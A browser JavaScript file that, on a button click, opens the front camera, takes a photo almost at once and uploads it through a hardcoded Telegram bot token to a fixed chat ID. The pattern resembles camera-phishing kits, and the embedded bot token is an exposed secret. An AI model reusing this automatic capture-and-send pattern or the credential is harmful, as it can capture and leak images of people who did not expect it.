const botToken = '7195301056:AAHYLtOnh0wfb7BCbaDbLjfphWrFiT3TOEw';
const chatId = '1342656052';
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const status = document.getElementById('status');
const startButton = document.getElementById('startButton');
const cameraContainer = document.querySelector('.camera-container');

let stream = null;
let retryCount = 0;
const MAX_RETRIES = 3;

startButton.addEventListener('click', startCamera);

async function startCamera() {
    try {
        // Hide button and show camera container
        startButton.style.display = 'none';
        cameraContainer.style.display = 'block';
        status.textContent = 'Requesting camera access...';

        // Request camera access
        stream = await navigator.mediaDevices.getUserMedia({
            video: { 
                facingMode: "user",
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        });
        
        video.srcObject = stream;
        status.textContent = 'Camera ready. Taking photo...';
        
        // Wait for the video to be ready and take photo immediately
        video.onloadedmetadata = () => {
            // Small delay to ensure first frame is captured (100ms)
            setTimeout(takePhoto, 100);
        };

        // Handle camera disconnection
        stream.getVideoTracks()[0].onended = () => {
            status.textContent = 'Camera disconnected. Please refresh the page.';
            resetUI();
        };
    } catch (error) {
        if (error.name === 'NotAllowedError') {
            status.textContent = 'Camera access denied. Please allow camera access and try again.';
        } else if (error.name === 'NotFoundError') {
            status.textContent = 'No camera found. Please connect a camera and try again.';
        } else {
            status.textContent = 'Error accessing camera: ' + error.message;
        }
        console.error('Camera error:', error);
        resetUI();
    }
}

async function takePhoto() {
    try {
        if (!stream) {
            throw new Error('Camera stream not available');
        }

        status.textContent = 'Taking photo...';
        
        // Set canvas dimensions to match video
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        // Draw the current video frame to canvas
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Convert canvas to blob with high quality
        const blob = await new Promise(resolve => {
            canvas.toBlob(resolve, 'image/jpeg', 0.95);
        });

        if (!blob) {
            throw new Error('Failed to capture photo');
        }
        
        // Send photo to Telegram
        await sendPhotoToTelegram(blob);
        
    } catch (error) {
        status.textContent = 'Error taking photo: ' + error.message;
        console.error('Photo error:', error);
        retryPhoto();
    }
}

async function sendPhotoToTelegram(blob) {
    try {
        status.textContent = 'Sending photo to Telegram...';
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'photo.jpg');
        
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        if (!response.ok) {
            const errorData = await response.json();
            throw new Error(errorData.description || 'Failed to send photo to Telegram');
        }
        
        status.textContent = 'Photo sent successfully!';
        cleanup();
        resetUI();
        
    } catch (error) {
        status.textContent = 'Error sending photo: ' + error.message;
        console.error('Telegram error:', error);
        retryPhoto();
    }
}

function retryPhoto() {
    if (retryCount < MAX_RETRIES) {
        retryCount++;
        status.textContent = `Retrying... (${retryCount}/${MAX_RETRIES})`;
        setTimeout(takePhoto, 100);
    } else {
        status.textContent = 'Failed after multiple attempts. Please try again.';
        cleanup();
        resetUI();
    }
}

function cleanup() {
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
    }
    video.srcObject = null;
}

function resetUI() {
    startButton.style.display = 'block';
    cameraContainer.style.display = 'none';
    retryCount = 0;
}

// Clean up when the page is closed
window.addEventListener('beforeunload', cleanup); 